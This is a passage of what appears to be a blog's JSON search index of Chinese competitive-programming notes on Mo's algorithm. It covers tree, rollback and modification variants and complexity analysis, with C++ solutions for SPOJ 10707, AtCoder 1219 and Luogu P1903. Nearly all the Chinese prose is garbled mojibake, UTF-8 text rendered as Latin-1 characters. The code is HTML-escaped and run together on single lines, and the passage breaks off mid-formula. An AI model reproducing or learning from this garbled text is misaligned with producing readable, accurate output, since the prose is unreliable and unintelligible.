åœ¨è¿›è¡Œè«é˜Ÿæ“ä½œæ—¶,å¦‚æœç¬¬ä¸€æ¬¡ç»è¿‡è¿™ä¸ªç‚¹,åˆ™addå…¶è´¡çŒ®,ç¬¬äºŒæ¬¡ç»è¿‡è¿™ä¸ªç‚¹,åˆ™è¯´æ˜è¿™ä¸ªç‚¹ä¸åœ¨æ‰€æ±‚é“¾ä¸Š,delå…¶è´¡çŒ®è¿™ä¸ªç”¨ä¸€ä¸ªvisæ•°ç»„,åå¤è¿›è¡Œå¼‚æˆ–æ“ä½œå°±å¯ä»¥è§£å†³ å†è€ƒè™‘è¯¢é—®çš„åŒºé—´çš„$l,r$åº”è¯¥èµ‹å€¼ä¸º$\\texttt{fst}$è¿˜æ˜¯$\\texttt{lst}$è®¾å·¦ç«¯ç‚¹çš„æ·±åº¦å°äºå³ç«¯ç‚¹ å¦‚æœ$LCA$å’Œå·¦ç«¯ç‚¹ç›¸ç­‰,åˆ™è¯´æ˜$[l,r]$åœ¨ä¸€æ¡é“¾ä¸Š,$l$å’Œ$r$å‡å–$\\texttt{fst}$å³å¯ å¦åˆ™æ˜¯ä¸¤æ¡é“¾$[l, LCA],[LCA,r]$, é˜²æ­¢å·¦å³ç«¯ç‚¹è¢«ç»Ÿè®¡ä¸¤æ¬¡å¯¼è‡´è´¡çŒ®è¢«åˆ é™¤,éœ€è¦$l$å–$\\texttt{lst}$,$r$å–$\\texttt{fst}$ æœ€åè€ƒè™‘è´¡çŒ® è‹¥æ˜¯ä¸Šé¢ç¬¬ä¸€ç§æƒ…å†µ,åœ¨ä¸€æ¡é“¾ä¸Š,ç›´æ¥ç»Ÿè®¡æ¬§æ‹‰åºåŒºé—´å†…æ‰€æœ‰ç‚¹å³å¯,é‡å¤ä¸¤æ¬¡çš„æ ¹æ®å‰æ–‡çš„æ€§è´¨ä¼šç›´æ¥åˆ æ‰ è‹¥æ˜¯ä¸Šé¢ç¬¬äºŒç§æƒ…å†µ,ç”±äºå·¦å³ç«¯ç‚¹éƒ½åœ¨$LCA$è¿™é¢—å­æ ‘å†…,æ‰€ä»¥åŒºé—´ä¸­å¹¶ä¸ä¼šå‡ºç°$LCA$,ä½†æ˜¯å´ä¸€å®šä¼šç»è¿‡,æ‰€ä»¥é¢å¤–å°†$LCA$åŠ å…¥è´¡çŒ®,å¹¶ä¸”è®°å½•ä¸‹å½“å‰ç»“æœä¹‹å,å†å°†å…¶è´¡çŒ®å‡å»,é˜²æ­¢å½±å“ä¸‹ä¸€ä¸ªæŸ¥è¯¢ æ³¨æ„: è½¬åŒ–ä¸ºæ¬§æ‹‰åºä¹‹åçš„åºåˆ—é•¿åº¦ä¸º$2n$ æ—¶é—´å¤æ‚åº¦ dfs: $O(n)$ æ±‚$LCA$:$O(n\\log n)$ è«é˜Ÿ: $O(n\\sqrt{n})$ ç»¼ä¸Š,æ ‘ä¸Šè«é˜Ÿçš„å¤æ‚åº¦ å·®ä¸å¤š ä¹Ÿæ˜¯$O(n\\sqrt{n})$ é’ˆå¯¹$\\mathcal{SP10707}$çš„å…·ä½“å®ç°æ²¡å•¥è¯´çš„,æ¨¡æ¿é¢˜,åšæ³•å…¨åœ¨ä¸Šé¢äº† ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 200020;int n, m, l, r, Ans, len, ocnt;int cnt[maxn], fst[maxn], lst[maxn], vis[maxn], ans[maxn];int ord[maxn], val[maxn], dep[maxn], fa[maxn][25], old[maxn];struct Query { int l, r, id, pos, lca;}q[maxn];bool cmp(Query a, Query b) { if (a.pos != b.pos) return a.pos &lt; b.pos; if (a.pos &amp; 1) return a.r &lt; b.r; return a.r &gt; b.r;}struct Edge { int from, to; Edge(int f, int t): from(f), to(t) {}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int f, int t) { edges.push_back(Edge(f, t)); edges.push_back(Edge(t, f)); int mm = edges.size(); G[t].push_back(mm - 1); G[f].push_back(mm - 2);}void dfs(int u, int f) { ord[++ocnt] = u; fst[u] = ocnt; for (int i = 0; i &lt; G[u].size(); ++i) { Edge&amp; e = edges[G[u][i]]; if (e.to == f) continue; dep[e.to] = dep[u] + 1; fa[e.to][0] = u; for (int j = 1; j &lt;= 20; ++j) { fa[e.to][j] = fa[fa[e.to][j - 1]][j - 1]; } dfs(e.to, u); } ord[++ocnt] = u; lst[u] = ocnt;}int lca(int x, int y) { if (dep[x] &gt; dep[y]) swap(x, y); for (int i = 20; i &gt;= 0; --i) { if (dep[fa[y][i]] &gt;= dep[x]) y = fa[y][i]; } if (x == y) return x; for (int i = 20; i &gt;= 0; --i) { if (fa[x][i] != fa[y][i]) { x = fa[x][i]; y = fa[y][i]; } } return fa[x][0];}void add(int x) { cnt[val[x]]--; if (!cnt[val[x]]) Ans--;}void del(int x) { cnt[val[x]]++; if (cnt[val[x]] == 1) Ans++;}void chg(int x) { if (vis[x]) add(x); else del(x); vis[x] ^= 1;}int main() { n = read(); m = read(); len = sqrt(2 * n); for (int i = 1; i &lt;= n; ++i) old[i] = val[i] = read(); sort(old + 1, old + 1 + n); int len_ = unique(old + 1, old + 1 + n) - old - 1; for (int i = 1; i &lt;= n; ++i) val[i] = lower_bound(old + 1, old + 1 + len_, val[i]) - old; for (int i = 1; i &lt; n; ++i) add(read(), read()); dep[1] = 1; dfs(1, 0); for (int i = 1; i &lt;= m; ++i) { int il = read(), ir = read(); int LCA = lca(il, ir); if (fst[il] &gt; fst[ir]) swap(il, ir); if (il == LCA) { q[i].l = fst[il]; q[i].r = fst[ir]; } else { q[i].l = lst[il]; q[i].r = fst[ir]; q[i].lca = LCA; } q[i].id = i; q[i].pos = (q[i].l - 1) / len + 1; } sort(q + 1, q + 1 + m, cmp); l = 1; for (int i = 1; i &lt;= m; ++i) { while (l &lt; q[i].l) chg(ord[l++]); while (r &gt; q[i].r) chg(ord[r--]); while (l &gt; q[i].l) chg(ord[--l]); while (r &lt; q[i].r) chg(ord[++r]); if (q[i].lca) chg(q[i].lca); ans[q[i].id] = Ans; if (q[i].lca) chg(q[i].lca); } for (int i = 1; i &lt;= m; ++i) { printf(&quot;%d\\n&quot;, ans[i]); } return 0;}","link":"/p/24f5ddbc.html"},{"title":"å›æ»šè«é˜Ÿ-ç¬”è®°  &#x2F;ã€ŒAtCoder 1219ã€æ­´å²ã®ç ”ç©¶-é¢˜è§£","text":"é€šè¿‡AtCoder 1219 æ­´å²ã®ç ”ç©¶è¿™é“é¢˜ç›®æ¥å­¦ä¹ ä¸€ä¸‹ å›æ»šè«é˜Ÿå›æ»šè«é˜Ÿ é€‚ç”¨äºå®¹æ˜“è¿›è¡Œaddæ“ä½œ,è€Œä¸å®¹æ˜“å®ç°delçš„æƒ…å†µ é€šè¿‡è«é˜Ÿçš„åˆ†å—,æŒ‡é’ˆç§»åŠ¨çš„æ€æƒ³,å¯ä»¥è®©å·¦æŒ‡é’ˆè¿›è¡Œå›æ»šæ“ä½œ, è¿‘ä¼¼ è¾¾åˆ°delçš„æ•ˆæœ å›æ»šè«é˜Ÿæ€æƒ³ç”±äºè«é˜Ÿå¯¹æ‰€æœ‰è¯¢é—®ç¦»çº¿æ’åºå,å½“å·¦ç«¯ç‚¹åœ¨åŒä¸€ä¸ªå—å†…æ—¶,å³ç«¯ç‚¹é€’å¢æ‰€ä»¥å¯¹äºæ¯ä¸ªå—,å³æŒ‡é’ˆç›´æ¥å‘å³ä¾æ¬¡æ‰§è¡Œaddæ“ä½œå³å¯ å¯¹äºå·¦æŒ‡é’ˆ,åœ¨ä¸€ä¸ªå—å†…æ—¶,å¯ä»¥æ¯æ¬¡éƒ½ä»å—çš„å³è¾¹ç•Œå‘å·¦è¿›è¡Œadd,ç”±äºä¸æ–¹ä¾¿è¿›è¡Œdelæ“ä½œ,æ‰€ä»¥å¯ä»¥å…ˆè®°å½•ä¸‹å·¦æŒ‡é’ˆåœ¨å³è¾¹ç•Œæ—¶çš„Ans,ç„¶åæ¯æ¬¡å‘å·¦ç§»åŠ¨åˆ°q[i].læ—¶,å°†å·¦æŒ‡é’ˆå†ç§»å›å³è¾¹ç•Œ,å¹¶ä¸”å°†Anså›æ»šåˆ°ç§»åŠ¨ä¹‹å‰çš„å€¼ã€‚ç”±äºåˆ†å—,è¿™æ ·åšçš„å¤æ‚åº¦ä¹Ÿä¸ä¼šå¾ˆå¤§ ç»¼ä¸Š,å¯¹äºæ¯ä¸ªå—,å³æŒ‡é’ˆä¾æ¬¡å‘å³æ¨è¿›,å·¦æŒ‡é’ˆåœ¨å³è¾¹ç•Œå’ŒæŸ¥è¯¢çš„å·¦ç«¯ç‚¹ä¹‹é—´åå¤æ¨ªè·³è¿™æ ·,æ‰§è¡Œçš„å°±åªå‰©addæ“ä½œ,é€šè¿‡å·¦æŒ‡é’ˆçš„æ¨ªè·³,é¿å…äº†delæ“ä½œ æ³¨æ„,å½“å·¦å³ç«¯ç‚¹éƒ½åœ¨åŒä¸€ä¸ªå—æ—¶,åªè¦æš´åŠ›æ±‚å‡ºç»“æœå°±å¯ä»¥äº†ä¸€å®šè¦æ³¨æ„: ä¸è¦ä½¿ç”¨å¥‡å¶æ’åº,å¿…é¡»ä¿è¯å³ç«¯ç‚¹çš„ å•è°ƒé€’å¢ å¯¹äºæ¯ä¸ªå—å†…çš„å¤„ç†,å¤§æ¦‚å¦‚ä¸‹å›¾: æ—¶é—´å¤æ‚åº¦æ—¶é—´å¤æ‚åº¦ç”±ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ç»„æˆ è¯¢é—®æ’åº åŒä¸€ä¸ªå—å†…çš„æš´åŠ›æ±‚è§£ å·¦æŒ‡é’ˆçš„ç§»åŠ¨(æ¨ªè·³) å³æŒ‡é’ˆçš„é¡ºæ¬¡ç§»åŠ¨ ä¸‹é¢æ¥ ä¸ä¸¥è°¨ ç®€è¦åœ°è®¡ç®—ä¸€ä¸‹æ—¶é—´å¤æ‚åº¦ æ’åº:$O(n\\log n)$ æš´åŠ›:æš´åŠ›çš„åŒºé—´æœ€é•¿ä¸º$\\sqrt{n}$,æ‰€ä»¥å•æ¬¡æš´åŠ›çš„å¤æ‚åº¦ä¸º$O(\\sqrt{n})$,$n$æ¬¡æš´åŠ›çš„å¤æ‚åº¦ä¸º$O(n\\sqrt{n})$å…¶å®åˆ°ä¸äº†næ¬¡ å·¦æŒ‡é’ˆç§»åŠ¨: è¿›è¡Œaddæ“ä½œçš„å¤æ‚åº¦ä¸º$O(1)$,å—é•¿$\\sqrt{n}$,æ¯æ¬¡å·¦ç§»æœ€åå¤æ‚åº¦$O(\\sqrt{n})$,å›æ»šæ—¶ä»éœ€è¦$O(\\sqrt{n})$æ¸…é™¤è´¡çŒ®æ‰€ä»¥å¯¹äºæ‰€æœ‰å—,ä¸€å…±è¦ç§»åŠ¨$q$æ¬¡,æ€»çš„å¤æ‚åº¦ä¸º$O(2q\\sqrt{n})$ å³æŒ‡é’ˆç§»åŠ¨: å¯¹äºæ¯ä¸ªå—,æœ€ååªè¦ç§»åŠ¨$n$æ¬¡,ä¸€å…±$\\sqrt{n}$ä¸ªå—,æ‰€ä»¥å¤æ‚åº¦ä¸º$O(n\\sqrt{n})$ ç»¼ä¸Š,æ€»çš„å¤æ‚åº¦ä¸º$O(n\\log n)+O(2q\\sqrt{n})+O(n\\sqrt{n})\\ \\sim\\ O(n\\sqrt{n})$ é’ˆå¯¹$\\mathcal{AT1219}$çš„å…·ä½“å®ç°æ·»åŠ è´¡çŒ®çš„addæ“ä½œå¾ˆå®¹æ˜“å®ç° 1234void add(int x) { cnt[a[x]]++; Ans = max(Ans, 1LL * cnt[a[x]] * old[a[x]]);} åŒä¸€å—å†…çš„æš´åŠ›ä¹Ÿå¾ˆå®¹æ˜“å®ç° 123456789LL solve(int l, int r) { LL res = 0; for (int i = l; i &lt;= r; ++i) cnt2[a[i]] = 0; for (int i = l; i &lt;= r; ++i) { cnt2[a[i]]++; res = max(res, 1LL * cnt2[a[i]] * old[a[i]]); } return res;} å…¶ä½™æƒ…å†µä¸‹æ ¹æ®å‰é¢æ‰€è¯´,å¯ä»¥å®ç° 123456while (r &lt; q[i].r) add(++r); // å³æŒ‡é’ˆå³ç§»,æ·»åŠ è´¡çŒ®LL tmp = Ans; // è®°å½•å·¦æŒ‡é’ˆç§»åŠ¨å‰çš„ç­”æ¡ˆwhile (l &gt; q[i].l) add(--l); // å·¦æŒ‡é’ˆå·¦ç§»,æ·»åŠ è´¡çŒ®ans[q[i].id] = Ans;while (l &lt; rpos[k] + 1) cnt[a[l++]]--; // å·¦æŒ‡é’ˆç§»åŠ¨å›å³è¾¹ç•Œ,å¹¶é€”ä¸­åˆ é™¤å¯¹cntçš„è´¡çŒ®Ans = tmp; // å›æ»šåˆ°ç§»åŠ¨å‰çš„ç­”æ¡ˆ ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long LL;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 100010;int n, m, len, l, r;int a[maxn], cnt[maxn], rpos[maxn], old[maxn], cnt2[maxn];LL Ans, ans[maxn];struct Query { int l, r, id, pos;}q[maxn];bool cmp(Query a, Query b) { if (a.pos != b.pos) return a.pos &lt; b.pos; return a.r &lt; b.r;}LL solve(int l, int r) { LL res = 0; for (int i = l; i &lt;= r; ++i) cnt2[a[i]] = 0; for (int i = l; i &lt;= r; ++i) { cnt2[a[i]]++; res = max(res, 1LL * cnt2[a[i]] * old[a[i]]); } return res;}void add(int x) { cnt[a[x]]++; Ans = max(Ans, 1LL * cnt[a[x]] * old[a[x]]);}int main() { n = read(); m = read(); len = sqrt(n); int num = ceil((double)n / len); for (int i = 1; i &lt;= num; ++i) rpos[i] = len * i; rpos[num] = n; for (int i = 1; i &lt;= n; ++i) old[i] = a[i] = read(); sort(old + 1, old + 1 + n); int len_ = unique(old + 1, old + 1 + n) - old - 1; for (int i = 1; i &lt;= n; ++i) a[i] = lower_bound(old + 1, old + 1 + len_, a[i]) - old; for (int i = 1; i &lt;= m; ++i) { q[i].l = read(); q[i].r = read(); q[i].id = i; q[i].pos = (q[i].l - 1) / len + 1; } sort(q + 1, q + 1 + m, cmp); l = 1; for (int k = 1, i = 1; k &lt;= num; ++k) { l = rpos[k] + 1, r = rpos[k], Ans = 0; memset(cnt, 0, sizeof(cnt)); while (q[i].pos == k) { if (q[i].l / len == q[i].r / len) { ans[q[i].id] = solve(q[i].l, q[i].r); i++; continue; } while (r &lt; q[i].r) add(++r); LL tmp = Ans; while (l &gt; q[i].l) add(--l); ans[q[i].id] = Ans; while (l &lt; rpos[k] + 1) cnt[a[l++]]--; Ans = tmp; i++; } } for (int i = 1; i &lt;= m; ++i) { printf(&quot;%lld\\n&quot;, ans[i]); } return 0;}","link":"/p/7d7b5548.html"},{"title":"å¸¦ä¿®è«é˜Ÿ-ç¬”è®°  &#x2F;ã€ŒLuogu P1903ã€æ•°é¢œè‰²-é¢˜è§£","text":"é€šè¿‡Luogu P1903 æ•°é¢œè‰²/ç»´æŠ¤åºåˆ—è¿™é“é¢˜ç›®æ¥å­¦ä¹ ä¸€ä¸‹ å¸¦ä¿®è«é˜Ÿé¡¾åæ€ä¹‰,å¸¦ä¿®è«é˜Ÿ ä¸ä»…è¦æ”¯æŒæ™®é€šè«é˜Ÿçš„æŸ¥è¯¢æ“ä½œ,è¿˜è¦æ”¯æŒæ•°æ®ä¸­é€”çš„ä¿®æ”¹ æ¯”å¦‚è¿™é“é¢˜ç›®,éœ€è¦å®ç°ä»¥ä¸‹ç›®æ ‡ æŸ¥è¯¢$[L,R]$åŒºé—´å†…ä¸åŒé¢œè‰²ç”»ç¬”çš„ç§æ•° å°†$pos$å¤„çš„ç”»ç¬”æ›¿æ¢ä¸º$color$é¢œè‰² è¾¾åˆ°è¿™ä¸ªç›®æ ‡,å¯ä»¥åœ¨æ™®é€šè«é˜Ÿçš„åŸºç¡€ä¸ŠåŠ ä¸€ä¸ªæ—¶é—´ç»´åº¦,å®ç° å¸¦ä¿®è«é˜Ÿ å¸¦ä¿®è«é˜Ÿæ—¶é—´æˆ³è¿™é‡Œçš„æ¯ä¸ªæŸ¥è¯¢çš„æ—¶é—´æˆ³è§„å®šä¸º æœ€è¿‘ä¿®æ”¹æ“ä½œçš„æ—¶é—´æˆ³,å³æœ€è¿‘ä¸€æ¬¡ä¿®æ”¹æ˜¯ç¬¬å‡ æ¬¡ä¿®æ”¹ä¿®æ”¹æ“ä½œä¼šå¢åŠ æ€»æ—¶é—´æˆ³,æŸ¥è¯¢æ“ä½œä¸ä¼šå¢åŠ æ—¶é—´æˆ³ æ€æƒ³åœ¨æ™®é€šè«é˜Ÿçš„å·¦å³ä¸¤ä¸ªæŒ‡é’ˆçš„åŸºç¡€ä¹‹ä¸Š å¢åŠ  ä¸€ä¸ª æ—¶é—´æˆ³æŒ‡é’ˆå½“å·¦å³ç«¯ç‚¹åŠæ—¶é—´æˆ³ç§»åŠ¨åˆ°å‡å’Œå½“å‰æŸ¥è¯¢çš„ä¸€è‡´,å°±å¯ä»¥è®°å½•ä¸‹å½“å‰ç­”æ¡ˆ æ‰€ä»¥éœ€è¦åœ¨æ™®é€šè«é˜Ÿçš„åŸºç¡€ä¹‹ä¸ŠåŠ ä¸Šä¿®æ”¹æ—¶é—´æˆ³çš„ä¿®æ”¹æ“ä½œ,å¹¶åŠ ä¸Šä»¥ä¸‹ä¸¤ä¸ªåˆ¤æ–­ 12while (t &lt; q[i].t) chg(++t);while (t &gt; q[i].t) chg(t--); å½“å½“å‰æ—¶é—´å°äºè¯¢é—®æ—¶é—´æ—¶,å…ˆå°†å½“å‰æ—¶é—´$+1$,å†ä¿®æ”¹å½“å½“å‰æ—¶é—´å¤§äºè¯¢é—®æ—¶é—´æ—¶,å…ˆä¿®æ”¹,å†å°†å½“å‰æ—¶é—´$-1$ ä¸æ™®é€šè«é˜Ÿè¿˜æœ‰ä¸€ç‚¹ä¸åŒ:æ‰€æœ‰è¯¢é—®çš„æ’åºæ–¹æ³•,å…ˆæŒ‰ç…§å·¦ç«¯ç‚¹åˆ†å—å‡åº,å†æŒ‰ç…§å³ç«¯ç‚¹ åˆ†å—å‡åº,æœ€åæŒ‰ç…§æ—¶é—´æˆ³å‡åºè¿™æ ·å¤æ‚åº¦æ‰ä¼šè¾¾åˆ°æœ€ä¼˜,èŠ‚çœäº†ä¸€ç³»åˆ—ä¸å¿…è¦çš„æ“ä½œ æ—¶é—´å¤æ‚åº¦å½“åˆ†å—çš„å¤§å°ä¸º$n^{\\frac{2}{3}}$æ—¶,å¤æ‚åº¦æœ€å°ä¸º$O(n^{\\frac{5}{3}})$å…·ä½“åˆ†æè§ä¸Šä¸€ç¯‡æ–‡ç« :æµ…æè«é˜Ÿç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ é’ˆå¯¹$\\mathcal{P1903}$çš„å…·ä½“å®ç°åœ¨æ¯ä¸ªè¯¢é—®Queryçš„ç»“æ„ä½“å†…åŠ ä¸€ä¸ªæ—¶é—´æˆ³$t$,å¹¶ä¸”æŒ‰ç…§ä¸Šæ–‡å®ç°æ’åº 12345678struct Query { int l, r, t, id;}q[maxn];bool cmp(Query a, Query b) { if (block[a.l] != block[b.l]) return block[a.l] &lt; block[b.l]; if (block[a.r] != block[b.r]) return block[a.r] &lt; block[b.r]; return a.t &lt; b.t;} å†å»ºä¸€ä¸ªç»“æ„ä½“Change,è¡¨ç¤ºæ¯æ¬¡ä¿®æ”¹æ“ä½œçš„æ•°æ®,éœ€è¦$pos$å’Œ$color$ 123struct Change { int pos, color;}c[maxn]; æ­£å¸¸çš„add/delæ“ä½œä¸å†èµ˜è¿°ç°åœ¨æ¥çœ‹ä¸€ä¸‹ä¿®æ”¹æ—¶é—´å¯¹åº”æ•°æ®çš„æ“ä½œ å½“å½“å‰æ—¶é—´çš„æ“ä½œçš„ä½ç½®$pos$åœ¨å½“å‰åŒºé—´$[l,r]$æ—¶,å¯¹ç­”æ¡ˆæœ‰å½±å“,éœ€è¦è°ƒæ•´å½“å‰ç­”æ¡ˆå…ˆå°†$pos$ä½ç½®ä¸Šçš„è´¡çŒ®åˆ å»,å†å°†å½“å‰ä¿®æ”¹æ“ä½œçš„$color$æ·»åŠ è¿›å» å°†$pos$ä½ç½®ä¸Šçš„æ•°ä¸$color$äº¤æ¢,è¿™æ ·å¯ä»¥ä¿è¯ä¹‹åå¯ä»¥å†æ¢å›æ¥ å®ç°å¦‚ä¸‹: 1234567void chg(int t) { if (l &lt;= c[t].pos &amp;&amp; c[t].pos &lt;= r) { if (--cnt[a[c[t].pos]] == 0) Ans--; // åˆ é™¤è´¡çŒ® if (cnt[c[t].color]++ == 0) Ans++; // æ·»åŠ è´¡çŒ® } swap(a[c[t].pos], c[t].color); // äº¤æ¢} å¦å¤–è¿™é¢˜ä¿®æ”¹æ•°æ®åä¸¥é‡å¡å¸¸,æ‰‹åŠ¨å¼€äº†O3,Ofast,inlineæ‰è¿‡ ä»£ç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#pragma GCC optimize(3)#pragma GCC optimize(&quot;Ofast&quot;)#pragma GCC optimize(&quot;inline&quot;)#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 140000;int n, m, l, r, t, len, cntq, cntr, Ans;int a[maxn], cnt[1000010], ans[maxn], block[maxn];struct Query { int l, r, t, id;}q[maxn];bool cmp(Query a, Query b) { if (block[a.l] != block[b.l]) return block[a.l] &lt; block[b.l]; if (block[a.r] != block[b.r]) return block[a.r] &lt; block[b.r]; return a.t &lt; b.t;}struct Change { int pos, color;}c[maxn];void add(int x) { if (cnt[a[x]] == 0) Ans++; cnt[a[x]]++;}void del(int x) { if (cnt[a[x]] == 1) Ans--; cnt[a[x]]--;}void chg(int t) { if (l &lt;= c[t].pos &amp;&amp; c[t].pos &lt;= r) { del(c[t].pos); if (cnt[c[t].color] == 0) Ans++; cnt[c[t].color]++; } swap(a[c[t].pos], c[t].color);}int main() { n = read(); m = read(); len = pow(n, 2.0 / 3.0); for (int i = 1; i &lt;= n; ++i) { a[i] = read(); block[i] = (i - 1) / len + 1; } for (int i = 1; i &lt;= m; ++i) { char opt[10]; scanf(&quot;%s&quot;, opt); if (opt[0] == 'Q') { q[++cntq].l = read(); q[cntq].r = read(); q[cntq].id = cntq; q[cntq].t = cntr; } else { c[++cntr].pos = read(); c[cntr].color = read(); } } sort(q + 1, q + 1 + cntq, cmp); l = 1; for (int i = 1; i &lt;= cntq; ++i) { while (l &lt; q[i].l) del(l++); while (r &gt; q[i].r) del(r--); while (l &gt; q[i].l) add(--l); while (r &lt; q[i].r) add(++r); while (t &lt; q[i].t) chg(++t); while (t &gt; q[i].t) chg(t--); ans[q[i].id] = Ans; } for (int i = 1; i &lt;= cntq; ++i) { printf(&quot;%d\\n&quot;, ans[i]); } return 0;}","link":"/p/838c5e29.html"},{"title":"æµ…æè«é˜Ÿç®—æ³•çš„æ—¶é—´å¤æ‚åº¦","text":"è¿™ç¯‡æ–‡ç« æ¥è®°å½•ä¸€ä¸‹è«é˜Ÿç®—æ³•æ—¶é—´å¤æ‚åº¦çš„ç®€å•(ä¸ä¸¥è°¨)è®¡ç®— é¦–å…ˆåˆ†æä¸€ä¸‹è«é˜Ÿç®—æ³•çš„æ—¶é—´å¤æ‚åº¦æœ‰å“ªäº›æ–¹é¢æ„æˆ å¯¹è¯¢é—®Queryæ•°ç»„çš„æ’åº åŒºé—´å·¦æŒ‡é’ˆçš„ç§»åŠ¨ åŒºé—´å³æŒ‡é’ˆçš„ç§»åŠ¨ æ—¶é—´å¤æ‚åº¦æ¯ä¸ªadd/delæ“ä½œçš„å¤æ‚åº¦ä¸º$O(1)$ æ’åºä½¿ç”¨sortå¯ä»¥åœ¨$O(n\\log n)$å†…å®Œæˆ ç”±äºå·¦æŒ‡é’ˆåœ¨æ’åºä¸­è¢«åˆ†å—,æ‰€ä»¥åˆåˆ†ä¸ºå—å†…ç§»åŠ¨å’Œå—é—´ç§»åŠ¨ å—å†…: è®¾æ¯å—ä¸­å«å·¦ç«¯ç‚¹$x_i$ä¸ª,ç”±äºæ¯å—å¤§å°ä¸º$\\sqrt{n}$,æ‰€ä»¥åœ¨å—å†…ç§»åŠ¨çš„æœ€åå¤æ‚åº¦ä¸º$O(x_i\\sqrt{n})$ã€‚å› æ­¤å¯¹äºæ‰€æœ‰å—,å°†å¤æ‚åº¦æ±‚å’Œ,å³ä¸º$O(\\displaystyle\\sum_ix_i\\sqrt{n})=O(n\\sqrt{n})$ å—é—´: å·¦æŒ‡é’ˆåœ¨æ¯ä¸ªå—å†…ç§»åŠ¨ä¹‹å,éœ€è¦ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå—å†…çš„å·¦ç«¯ç‚¹å¤„,å—é—´è·³è½¬æœ€åè·¨ä¸¤ä¸ªæ•´å—éœ€è¦$O(2\\sqrt{n})$ã€‚æ€»å…±éœ€è¦è·¨$\\sqrt{n}-1$ä¸ªå—,æ‰€ä»¥å¤æ‚åº¦ä¸º$O((\\sqrt{n}-1)\\times 2\\sqrt{n})\\sim O(n)$ ç»¼ä¸Š,å·¦æŒ‡é’ˆç§»åŠ¨çš„å¤æ‚åº¦ä¸º$O(n\\sqrt{n})$3. å½“å·¦æŒ‡é’ˆåœ¨åŒä¸€ä¸ªå—å†…æ—¶,å³æŒ‡é’ˆæ˜¯æœ‰åºçš„,å› æ­¤å½“å·¦æŒ‡é’ˆåœ¨åŒä¸€ä¸ªå—å†…æ—¶,å³æŒ‡é’ˆç§»åŠ¨çš„æœ€åå¤æ‚åº¦ä¸º$O(n)$å³å…¨éƒ¨ç§»åŠ¨ä¸€éã€‚è€Œæ¯ä¸ªå—é•¿åº¦ä¸º$\\sqrt{n}$,æ€»é•¿ä¸º$n$,æ‰€ä»¥ä¸€å…±$\\sqrt{n}$ä¸ªå—,æ‰€ä»¥æœ€åå¤æ‚åº¦ä¸º$O(n\\sqrt{n})$ ç»¼ä¸Š,æ™®é€šè«é˜Ÿç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º$$O(n\\log n)+O(n\\sqrt{n})+O(n\\sqrt{n})\\ \\sim\\ O(n\\sqrt{n})$$ ç„å­¦çš„å¥‡å¶æ’åºä¼˜åŒ–è§å›¾: åˆ†å—å¤§å°ä¸ä¸º$\\sqrt{n}$è¿˜æ˜¯å’Œå‰é¢ä¸€æ ·æ¨å¤æ‚åº¦,è®¾å—å¤§å°ä¸º$a&gt;1$ æ’åº: éœ€è¦$O(n\\log n)$ å·¦æŒ‡é’ˆç§»åŠ¨: å—å†…: $O(\\displaystyle\\sum_ix_ia)=O(na)$ å—é—´: $O((\\dfrac{n}{a}-1)\\times 2a)=O(n)$ å³æŒ‡é’ˆç§»åŠ¨: $O(n\\times \\dfrac{n}{a})=O(\\dfrac{n^2}{a})$ ç»¼ä¸Š,æ€»çš„å¤æ‚åº¦ä¸º$O(n\\log n)+O(na)+O(n)+O(\\dfrac{n^2}{a})=O(na+\\dfrac{n^2}{a})$æ ¹æ®å‡å€¼ä¸ç­‰å¼,è‹¥è®©ä¸Šå¼å¤æ‚åº¦æœ€å°,åˆ™éœ€è¦$na=\\dfrac{n^2}{a}$,å³$a=\\sqrt{n}$æ‰€ä»¥å½“å«æœ‰å·¦å³ä¸¤ä¸ªæŒ‡é’ˆæ—¶,åˆ†å—å¤§å°ä¸º$\\sqrt{n}$æ—¶æ€»å¤æ‚åº¦æœ€å°,ä¸º$O(n\\sqrt{n})$ å¸¦ä¿®è«é˜Ÿ(ä¸‰æŒ‡é’ˆ)è¿˜æ˜¯è®¾åˆ†å—çš„å¤§å°ä¸º$a&gt;1$,æ³¨æ„å¸¦ä¿®è«é˜Ÿæ’åºä¼˜å…ˆçº§:å…ˆå·¦ç«¯ç‚¹æ‰€åœ¨å—,å†å³ç«¯ç‚¹æ‰€åœ¨å—,åæ—¶é—´æˆ³å¤§å° æ’åº: $O(n\\log n)$ å·¦æŒ‡é’ˆç§»åŠ¨: åŒä¸Šæ¨å¯¼,å¤æ‚åº¦ä¸º$O(na)$ å³æŒ‡é’ˆç§»åŠ¨: ç›¸åŒå³ç«¯ç‚¹çš„å—çš„å¤æ‚åº¦åŒä¸Š$O(na)$,è¿˜æœ‰æ¢å·¦ç«¯ç‚¹å†³å®šçš„å—æ—¶çš„å¤æ‚åº¦çº¦ä¸º$O(\\dfrac{n^2}{a})$ æ—¶é—´æˆ³ç§»åŠ¨: ç”±æ’åºä¼˜å…ˆçº§å¯è§,åªæœ‰å½“å³ç«¯ç‚¹æ‰€åœ¨å—ç›¸åŒæ—¶æ‰ä¼šç§»åŠ¨æ—¶é—´æˆ³,è€Œæ¯æ¬¡ç§»åŠ¨æœ€åéœ€è¦ç§»åŠ¨$\\sum t \\sim 